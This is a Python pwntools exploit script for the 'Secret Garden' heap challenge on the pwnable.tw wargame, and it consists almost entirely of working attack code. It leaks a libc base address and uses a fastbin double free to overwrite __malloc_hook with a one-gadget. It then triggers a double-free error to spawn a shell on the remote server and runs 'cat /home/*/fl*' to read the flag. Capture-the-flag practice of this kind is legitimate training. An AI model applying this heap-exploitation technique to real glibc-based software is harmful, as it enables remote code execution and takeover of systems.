#Exploit for pwnable.tw/Secret Garden
from pwn import *
target = process(['./ld-2.23.so', './secretgarden'], env={"LD_PRELOAD":"./libc_64.so.6"})
target = remote('chall.pwnable.tw', 10203)
libc = ELF('./libc_64.so.6')
gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]

def sa(s, d):
	target.sendafter(s, d)

def sla(s, d):
	sa(s, d + "\n")

def add(size, name, color):
	sa(" : ", "1")
	sla(":", str(size))
	sa(":", name)
	sla(":", color)

def visit():
	sa(" : ", "2")

def remove(idx):
	sa(" : ", "3")
	sla(":", str(idx))

def clean():
	sa(" : ", "4")

chunk_size = 0x450
add(chunk_size, "DUMB", "Orange")
add(chunk_size, "JUNK", "Blue")
add(chunk_size, "JUNK", "Red")
remove(0)
remove(1)
add(chunk_size, "_whoamiT" , "Leaker")
visit()
target.recvuntil("_whoamiT")
libc_base = u64(target.recvline().strip().ljust(8, "\x00")) - (0x7f711c997f78 - 0x7f711c5d4000)
print("LIBC Base: " + hex(libc_base))

fast_chunk = 0x68
for i in range(3):
	add(fast_chunk, "Preparation", "WHITE")

remove(5)
remove(6)
remove(5)

add(fast_chunk, p64(libc_base + libc.sym['__malloc_hook'] - 0x23), "1337")
add(fast_chunk, "LEET", "BLACK")
add(fast_chunk, "LEET", "BLACK")
add(fast_chunk, "A"*(0x13) + p64(libc_base + gadgets[2]), "HACKED!")
#Direct malloc() doesn't work, since args to execve() aren't met, so invoke double free error, which will in turn call malloc()
remove(1)
remove(1)
target.sendline("cat /home/*/fl*")
print(target.recvline())
